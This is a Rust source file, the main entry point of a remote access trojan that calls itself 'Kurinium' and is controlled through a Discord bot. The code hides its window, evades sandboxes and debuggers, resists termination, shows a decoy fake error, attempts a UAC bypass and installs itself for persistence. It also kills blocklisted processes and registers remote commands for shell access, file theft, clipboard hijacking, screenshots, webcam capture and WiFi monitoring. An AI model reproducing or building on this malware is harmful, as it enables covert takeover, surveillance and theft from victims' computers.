// Hide console window in release builds
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![allow(dead_code)]

use crate::prelude::*;
use std::env;
use twilight_gateway::{Event, EventTypeFlags, Intents, Shard, ShardId, StreamExt};

use crate::core::decoy::show_fake_error;
use crate::core::instance::singleton_prcess;
use crate::core::keep_active::start_keep_active;

use crate::system_info::{DeviceInfo, SystemInfo};

// Modules
mod command_registry;
mod commands;
mod config;
mod core;
mod handler;
mod installation;
mod prelude;
mod system_info;
mod uac_bypass;
mod utils;

// Re-exports for other modules
use commands::core::*;
use commands::crypto::*;
use commands::filesystem::*;
use commands::network::*;
use commands::system::*;
use commands::utility::*;

use crate::core::exit_patcher::safe_exit;

// Register all commands
async fn register_all_commands() -> anyhow::Result<()> {
    let registry = command_registry::get_registry();

    register_commands!(
        registry,

        // Core commands
        HelpCommand,
        PingCommand,
        InfoCommand,
        ShellCommand,
        LinkRunCommand,
        ExitCommand,
        AuthCommand,

        // Crypto commands
        EncryptCommand,
        DecryptCommand,

        // Filesystem commands
        CatCommand,
        CdCommand,
        CheckDriveCommand,
        ClearCommand,
        DownloadCommand,
        FileInfoCommand,
        GetCommand,
        GrabCommand,
        LsCommand,
        MkdirCommand,
        RemoveCommand,
        RenameCommand,
        SizeCommand,
        UnrarCommand,
        UnzipCommand,
        UploadCommand,
        ZipCommand,

        // System commands
        ProcessCommand,
        MonitorCommand,
        UpdateCommand,
        UninstallCommand,
        VolumeCommand,
        BlockInputCommand,
        ScreenCommand,
        CapsFlickerCommand,
        VisibleCommand,
        HostCommand,
        WinKillCommand,

        // Utility commands
        ClipboardCommand,
        ClipperCommand,
        ForegroundCommand,
        JumpscareCommand,
        OpenUrlCommand,
        PlaySoundCommand,
        PrintCommand,
        ScreenshotCommand,
        WebcamCommand,
        RobloxCommand,

        // Network commands
        IpconfigCommand,
    )?;

    log_debug!("Registered {} commands", registry.command_count());
    Ok(())
}

fn run_saa() -> bool {
    use crate::core::anti_analysis::{run_checks, AntiAnalysisConfig, EvasionAction, random_delay};

    let config = AntiAnalysisConfig {
        check_vm: false,
        check_sandbox: true,
        check_debugger: true,
        min_uptime_seconds: 300,
        min_ram_gb: 2,
        min_processes: 40,
        min_disk_gb: 50,
        delay_range: (30, 90),
        action: EvasionAction::DelayThenExit,
    };

    let result = run_checks(&config);

    if result.is_detected() {
        log_debug!("Anti Analysis ----------");
        log_debug!("  - Sandbox: {}", result.is_sandbox);
        log_debug!("  - Debugger: {}", result.is_debugger);
        for reason in &result.reasons {
            log_debug!("  - Reason: {}", reason);
        }
        log_debug!("Exiting...");

        random_delay(config.delay_range);
        safe_exit(0);
    }

    false
}

fn run_softaa() -> Option<Vec<String>> {
    use crate::core::anti_analysis::{run_checks, AntiAnalysisConfig, EvasionAction};

    let config = AntiAnalysisConfig {
        check_vm: false,
        check_sandbox: true,
        check_debugger: true,
        min_uptime_seconds: 120,
        min_ram_gb: 2,
        min_processes: 30,
        min_disk_gb: 40,
        delay_range: (0, 0),
        action: EvasionAction::ReportOnly,
    };

    let result = run_checks(&config);

    if result.is_detected() {
        log_debug!("Anti Analysis ----------");
        log_debug!("  - Sandbox signs: {}", result.is_sandbox);
        log_debug!("  - Debugger signs: {}", result.is_debugger);
        for reason in &result.reasons {
            log_debug!("  - Warning: {}", reason);
        }
        log_debug!("Continue...");

        return Some(result.reasons);
    }

    None
}

fn setup_exit_protection() -> bool {
    use crate::core::exit_patcher;

    match exit_patcher::patch_exit() {
        true => {
            let patched = exit_patcher::get_patched_functions();
            log_debug!("[ExitPatcher] Successfully patched {} exit functions", patched.len());
            for func in &patched {
                log_debug!("  - {}", func);
            }
            true
        }
        false => {
            log_debug!("[ExitPatcher] Failed to patch exit functions");
            false
        }
    }
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // Hide console IMMEDIATELY at startup (before any other code runs)
    #[cfg(not(debug_assertions))]
    {
        unsafe {
            let console = winapi::um::wincon::GetConsoleWindow();
            if !console.is_null() {
                winapi::um::winuser::ShowWindow(console, winapi::um::winuser::SW_HIDE);
            }
        }
    }

    // Initialize file logger for debug output (writes to debug.log next to exe)
    if Config::SHOW_CONSOLE {
        crate::utils::logger::init_logger();
    }

    let args: Vec<String> = env::args().collect();
    let hide_decoy_flag = args.contains(&"--hide-decoy".to_string());

    let mut is_admin_privileged = uac_bypass::is_admin();
    singleton_prcess(is_admin_privileged);

    // ========================================================================
    #[cfg(not(debug_assertions))]
    {
        if setup_exit_protection() {
            log_debug!("[ExitPatcher] Process termination protection enabled");
        }
    }

    #[cfg(debug_assertions)]
    {
        log_debug!("[ExitPatcher] Skipped (debug build)");
    }

    // ========================================================================
    let current_exe = env::current_exe().unwrap_or_default();
    let is_installed = installation::check_if_installed(&current_exe);

    #[cfg(not(debug_assertions))]
    {
        if !is_installed {
            log_debug!("[Anti-Analysis] Running checks");
            run_saa();
            log_debug!("[Anti-Analysis] Checks passed!");
        } else {
            log_debug!("[Anti-Analysis] Running checks...");
            let warnings = run_softaa();
            if warnings.is_some() {
                log_debug!("[Anti-Analysis] Warnings detected but continuing...");
            } else {
                log_debug!("[Anti-Analysis] Checks passed!");
            }
        }
    }

    #[cfg(debug_assertions)]
    {
        log_debug!("[Anti-Analysis] Skipped (debug build)");
    }
    // ========================================================================

    // Show decoy message if config
    let decoy_config = Config::get_decoy_config();
    if decoy_config.enabled && !hide_decoy_flag {
        std::thread::spawn(move || {
            show_fake_error(&decoy_config);
        });
    }

    // Start keep-active thread to prevent sleep
    let keep_active_config = Config::get_keep_active_config();
    let _keep_active_thread = start_keep_active(&keep_active_config);

    //@ UAC Bypass
    if !is_admin_privileged {
        log_debug!("Not running with admin privileges, attempting UAC bypass...");

        if uac_bypass::attempt_uac_bypass() {
            is_admin_privileged = uac_bypass::is_admin();
            if is_admin_privileged {
                log_debug!("UAC bypass successful! Now running with admin privileges.");
            } else {
                log_debug!("UAC bypass failed. Continuing without admin privileges.");
            }
        } else {
            log_debug!("UAC bypass failed. Continuing without admin privileges.");
        }
    } else {
        log_debug!("Already running with admin privileges.");
    }

    //@ Installation
    // Note: is_installed already checked above for anti-analysis
    if is_admin_privileged && !is_installed {
        log_debug!("Starting installation process...");

        match installation::install_to_path() {
            Ok(_) => {
                log_debug!("Installation completed successfully!");
            }
            Err(e) => {
                log_debug!("Installation failed: {}", e);
            }
        }

        log_debug!("Setting up startup task...");

        // Use async startup check
        match crate::core::startup::check_startup().await {
            Ok(_) => {
                log_debug!("Startup task created successfully!");
            }
            Err(e) => {
                log_debug!("Startup task failed: {}", e);
            }
        }

        log_debug!("Installation complete. Exiting original process...");
        if Config::SHOW_CONSOLE {
            std::thread::sleep(std::time::Duration::from_secs(2));
        }
        safe_exit(0);
    }

    //@ Authentication
    let auth_config = Config::get_auth_config();
    crate::core::auth::init_auth_manager(auth_config);

    //@ Get config
    let token = Config::get_token();
    let guild_id = Config::get_guildid();

    //@ Register commands
    tokio::spawn(async move {
        match register_all_commands().await {
            Err(e) => {
                log_debug!("Failed to register commands: {}", e);
            }
            Ok(_) => {
                log_debug!("Kurinium, Is a FREE RAT project. https://github.com/Mikasuru/Kurinium");
                log_debug!("All commands registered in registry");
            }
        }
    });

    //@ Blocklist Process Monitor
    tokio::spawn(async move {
        use sysinfo::{ProcessExt, System, SystemExt, PidExt};
        use std::collections::HashSet;
        use std::fs;
        
        fn load_blocklist() -> HashSet<String> {
            let path = installation::get_install_path().join("blocklist.json");
            if let Ok(content) = fs::read_to_string(&path) {
                content.lines()
                    .filter(|l| !l.is_empty())
                    .map(|l| {
                        let name = l.trim().to_lowercase();
                        if name.ends_with(".exe") {
                            name[..name.len()-4].to_string()
                        } else {
                            name
                        }
                    })
                    .collect()
            } else {
                HashSet::new()
            }
        }

        let mut sys = System::new_all();
        let mut killed_pids: HashSet<u32> = HashSet::new();

        loop {
            let blocklist = load_blocklist();
            
            if !blocklist.is_empty() {
                sys.refresh_processes();
                
                for (pid, process) in sys.processes() {
                    let pid_u32 = pid.as_u32();
                    
                    if killed_pids.contains(&pid_u32) {
                        continue;
                    }
                    
                    let proc_name = process.name().to_lowercase();
                    let proc_name_base = if proc_name.ends_with(".exe") {
                        &proc_name[..proc_name.len()-4]
                    } else {
                        &proc_name
                    };
                
                    if blocklist.contains(proc_name_base) {
                        if process.kill() {
                            killed_pids.insert(pid_u32);
                            log_debug!("[BlockMonitor] Killed: {} (PID: {})", proc_name, pid_u32);
                        }
                    }
                }
                
                sys.refresh_processes();
                let running: HashSet<u32> = sys.processes().keys().map(|p| p.as_u32()).collect();
                killed_pids.retain(|pid| running.contains(pid));
            }
            
            tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
        }
    });

    //@ Discord Connection
    let http = Arc::new(HttpClient::new(token.clone()));
    let channel_manager = crate::core::discord::channel::ChannelManager::new(
        HttpClient::new(token.clone()),
        guild_id,
    );

    let device_channel_id = channel_manager.init_dchannel().await?;
    log_debug!("Device channel initialized: {}", device_channel_id);

    //@ Gateway configuration
    let intents = Intents::GUILD_MESSAGES | Intents::MESSAGE_CONTENT;

    //@ Start WiFi monitoring
    let wifi_config = Config::get_wifi_monitor_config();
    let wifi_monitor =
        crate::core::wifi_monitor::WifiMonitor::new(http.clone(), device_channel_id, wifi_config);
    if let Err(e) = wifi_monitor.start_monitoring().await {
        log_debug!("Failed to start WiFi monitoring: {}", e);
    } else if Config::get_wifi_monitor_config().enabled {
        log_debug!("WiFi monitoring started successfully");
    }

    log_debug!("Prefix: {}", Config::BOT_PREFIX);
    log_debug!("Guild ID: {}", guild_id);
    log_debug!("[ Logging enabled ]-----------------------------------");

    //@ Event Loop With Reconnection
    let mut reconnect_delay = 5u64;
    const MIN_RECONNECT_DELAY: u64 = 5;
    const MAX_RECONNECT_DELAY: u64 = 60;

    loop {
        let mut shard = Shard::new(ShardId::new(0, 1), token.clone(), intents);

        log_debug!("Connecting to Discord gateway...");
        let mut connected_successfully = false;

        loop {
            let item = shard.next_event(EventTypeFlags::all()).await;

            let event = match item {
                Some(Ok(event)) => event,
                Some(Err(source)) => {
                    log_debug!("Error receiving event: {:?}", source);
                    break;
                }
                None => {
                    log_debug!("Event stream ended, reconnecting...");
                    break;
                }
            };

            match event {
                Event::Ready(_) => {
                    connected_successfully = true;
                    reconnect_delay = MIN_RECONNECT_DELAY;
                    log_debug!("Bot is ready!");
                }

                Event::Resumed => {
                    connected_successfully = true;
                    log_debug!("Gateway session resumed");
                }

                Event::MessageCreate(msg) => {
                    if let Err(e) = handler::handle_message(&http, msg.0, device_channel_id).await {
                        log_debug!("Error handling message: {}", e);
                    }
                }

                Event::InteractionCreate(interaction) => {
                    if let Err(e) = handler::handle_interaction(&http, interaction.0).await {
                        log_debug!("Error handling interaction: {}", e);
                    }
                }

                Event::GatewayClose(frame_opt) => {
                    if let Some(frame) = frame_opt {
                        log_debug!("Gateway closed with code: {}", frame.code);

                        match frame.code {
                            4004 => {
                                log_debug!("Authentication failed: Invalid token.");
                                return Err(anyhow::anyhow!("Invalid token"));
                            }
                            4010 => {
                                log_debug!("Invalid shard");
                                return Err(anyhow::anyhow!("Invalid shard"));
                            }
                            4011 => {
                                log_debug!("Sharding required");
                                return Err(anyhow::anyhow!("Bot too large, needs sharding"));
                            }
                            4013 => {
                                log_debug!("Invalid intents");
                                return Err(anyhow::anyhow!("Invalid intents"));
                            }
                            4014 => {
                                log_debug!("Disallowed intents");
                                return Err(anyhow::anyhow!("Privileged intents not enabled"));
                            }
                            _ => {}
                        }
                    } else {
                        log_debug!("Gateway closed without close frame");
                    }

                    break; // Break to reconnect
                }

                Event::GatewayInvalidateSession(can_resume) => {
                    log_debug!("Session invalidated (resumable: {})", can_resume);
                    break;
                }

                _ => {}
            }
        }

        // Determine reconnect delay
        if !connected_successfully {
            reconnect_delay = (reconnect_delay * 2).min(MAX_RECONNECT_DELAY);
            log_debug!(
                "Failed to establish connection. Waiting {} seconds before retry...",
                reconnect_delay
            );
        } else {
            reconnect_delay = MIN_RECONNECT_DELAY;
            log_debug!(
                "Disconnected. Reconnecting in {} seconds...",
                reconnect_delay
            );
        }

        tokio::time::sleep(tokio::time::Duration::from_secs(reconnect_delay)).await;
    }
}